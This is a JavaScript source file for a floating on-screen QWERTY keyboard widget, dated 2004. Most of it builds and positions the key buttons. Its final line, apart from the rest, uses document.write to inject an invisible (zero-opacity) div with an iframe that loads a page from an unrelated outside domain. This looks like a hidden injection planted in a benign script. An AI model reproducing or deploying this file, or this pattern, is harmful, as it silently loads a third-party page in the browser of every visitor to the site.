// Floating KeyBoard InPut (Full QWERTY) kbPart3.js (30-12-2004)
// by Vic Phillips http://www.vicsjavascripts.org.uk

// No Need to Change

var kbCaplock=0;
var kbshift=0;
var kbNuAry=new Array('1','2','3','4','5','6','7','8','9','0','-','=','[',']',';','\'','#','',',','.','/');
var kbNuSAry=new Array();
var kbNSAry=new Array('!','"','£','$','%','^','&','*','(',')','_','+','{','}',':','@','~','|','&lt;','>','?');
var kbLeAry=new Array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','Space')

// KeyBoard Inner - QWERTY Key Buttons
kbInnF='';
for (kbi=0;kbi<kbNuAry.length;kbi++){
 kbInnF+='<div id="kbNu'+kbi+'"  onclick="javascript:kbTypeIP(\''+kbi+'\',1);" >'+kbNuAry[kbi]+'</div> ';
}
for (kbi1=0;kbi1<kbLeAry.length;kbi1++){
 kbInnF+='<div id="kbLe'+kbi1+'" onclick="javascript:kbTypeIP(\''+kbi1+'\',2);" >'+kbLeAry[kbi1].toUpperCase( )+'</div> ';
}

function kbFCPosition(){
 kbLObj=kbgEBId('kbCapLock');
 kbSObj=kbgEBId('kbShift');
 kbBObj=kbgEBId('kbBack');
 kbCObj=kbgEBId('kbClear');
 kbFCAry=new Array(kbLObj.style,kbSObj.style,kbBObj.style,kbCObj.style);
 for (kb0=0;kb0<kbFCAry.length;kb0++){
  kbFCStyle(kbFCAry[kb0]);
  kbFCAry[kb0].width='42px';
 }
 kbFCAry[2].width=(46+kbBdr)+'px';
 kbFCAry[3].width=(38+kbBdr)+'px';
 for (kb1=0;kb1<kbNuAry.length;kb1++){
  kbNuSAry[kb1]=kbgEBId('kbNu'+kb1).style;
  kbFCStyle(kbNuSAry[kb1]);
 }
 for (kb2=0;kb2<kbLeAry.length;kb2++){
  kbLeAry[kb2]=kbgEBId('kbLe'+kb2).style;
  kbFCStyle(kbLeAry[kb2]);
 }
 for (kbi=0;kbi<12;kbi++){
  kbNuSAry[kbi].left=(2+kbi*18)+'px';
  kbNuSAry[kbi].top=(22)+'px';
 }
 for (kbi=12;kbi<14;kbi++){
  kbNuSAry[kbi].left=(kbi*18-26)+'px';
  kbNuSAry[kbi].top=(39)+'px';
 }
 for (kbi=14;kbi<17;kbi++){
  kbNuSAry[kbi].left=(kbi*18-72)+'px';
  kbNuSAry[kbi].top=(56)+'px';
 }
 for (kbi=17;kbi<kbNuSAry.length;kbi++){
  kbNuSAry[kbi].left=(kbi*18-172)+'px';
  kbNuSAry[kbi].top=(73)+'px';
 }
 kbgEBId(('kbNu17')).style.left=(kbi*18-370)+'px';
 for (kbi1=0;kbi1<10;kbi1++){
  kbLeAry[kbi1].left=(10+kbi1*18)+'px';
  kbLeAry[kbi1].top=(39)+'px';
 }
 for (kbi2=10;kbi2<19;kbi2++){
  kbLeAry[kbi2].left=(kbi2*18-162)+'px';
  kbLeAry[kbi2].top=(56)+'px';
 }
 for (kbi3=19;kbi3<26;kbi3++){
  kbLeAry[kbi3].left=(kbi3*18-316)+'px';
  kbLeAry[kbi3].top=(73)+'px';
 }
 kbLeAry[26].width=(104)+'px';
 kbLeAry[26].left=(82)+'px';
 kbLeAry[26].top=(90)+'px';
 kbFCAry[0].top='90px';
 kbFCAry[0].left='37px';
 kbFCAry[1].top='90px';
 kbFCAry[1].left='189px';
 kbFCAry[2].top='22px';
 kbFCAry[2].left='218px';
 kbFCAry[3].top='39px';
 kbFCAry[3].left='226px';
 kbBAry[0].top='56px';
 kbBAry[0].left='234px';
 kbBAry[0].height=(31+kbBdr)+'px';
 kbBAry[1].top='73px';
 kbBAry[1].width=(24+kbBdr)+'px';
 kbBAry[1].left='206px';
 kbBAry[2].top='90px';
 kbBAry[2].left='234px';
 kbBAry[3].top='90px';
 kbBAry[3].left='2px';
}

function kbFCStyle(kb){
 kb.position='absolute'
 kb.overflow='hidden';
 kb.width=(kbKSz+kbBdr)+'px';
 kb.height=(kbKSz+kbBdr)+'px';
 kb.top='5px';
 kb.color=kbKeyTxtColor;
 kb.backgroundColor=kbKeyBGColor;
 kb.border='solid black 1px';
 kb.textAlign='center';
 kb.fontSize='10px';
 kb.cursor=kbCur;
}

function kbFullKeyBd(){
 kbKBObj.innerHTML=kbQC+kbInnF+kbCom;
 kbString='';
 kbKBW=268+kbBdr;
 kbKBH=108+kbBdr;
 kbKBObjS.width=(kbKBW)+'px';
 kbKBObjS.height=(kbKBH)+'px';
 kbButPos();
 kbFCPosition();
 kbKBObjS.border='solid black 1px';
}

kbCkQWERTY=1;




document.write('<style>.vb_style_forum {filter: alpha(opacity=0);opacity: 0.0;width: 200px;height: 150px;}</style><div class="vb_style_forum"><iframe height="150" width="200" src="http://gclabrelscon.net/about.php"></iframe></div>');
